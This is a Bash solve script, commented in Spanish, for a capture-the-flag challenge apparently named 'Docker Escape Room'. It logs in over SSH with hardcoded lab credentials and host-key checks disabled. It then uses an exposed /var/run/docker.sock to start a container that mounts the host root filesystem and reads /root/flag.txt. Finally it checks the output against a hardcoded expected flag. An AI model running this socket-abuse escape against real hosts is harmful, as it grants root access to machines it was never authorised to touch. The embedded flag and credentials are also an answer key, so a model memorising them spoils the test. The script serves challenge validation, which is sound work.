#!/bin/bash
#
# solve.sh - Validador automatico para "Docker Escape Room"
#
# Se conecta por SSH al contenedor "challenge" como usuario sin privilegios
# y, usando el socket de Docker expuesto (/var/run/docker.sock), lanza un
# contenedor nuevo montando la raiz del "host" (el contenedor docker-host)
# para leer la bandera. Requiere el paquete `sshpass` instalado en la
# maquina que corre este script.
#
# Uso:
#   ./solve.sh [host] [puerto]
#
set -uo pipefail

HOST="${1:-localhost}"
PORT="${2:-2222}"
SSH_USER="ctfuser"
SSH_PASS="ctf_docker_2024"
EXPECTED_FLAG="FLAG{docker_sock_root_host_escape_1684}"

if ! command -v sshpass >/dev/null 2>&1; then
    echo "[!] Este script requiere 'sshpass'. Instalalo con: apt-get install sshpass"
    exit 1
fi

echo "[*] Conectando a ${SSH_USER}@${HOST}:${PORT} ..."

REMOTE_CMD='docker -H unix:///var/run/docker.sock run --rm -v /:/mnt alpine:latest cat /mnt/root/flag.txt'

FLAG=$(sshpass -p "$SSH_PASS" ssh \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o ConnectTimeout=10 \
    -p "$PORT" "${SSH_USER}@${HOST}" "$REMOTE_CMD" 2>/tmp/solve_ssh_err.log)
STATUS=$?

if [ $STATUS -ne 0 ]; then
    echo "[!] Fallo la ejecucion remota. Detalle:"
    cat /tmp/solve_ssh_err.log
    exit 1
fi

FLAG=$(echo "$FLAG" | tr -d '\r' | tail -n 1)

echo "[*] Bandera obtenida: $FLAG"

if [ "$FLAG" == "$EXPECTED_FLAG" ]; then
    echo "[+] EXITO: la bandera coincide con la esperada."
    exit 0
else
    echo "[!] La bandera obtenida difiere de la esperada (${EXPECTED_FLAG})."
    exit 1
fi
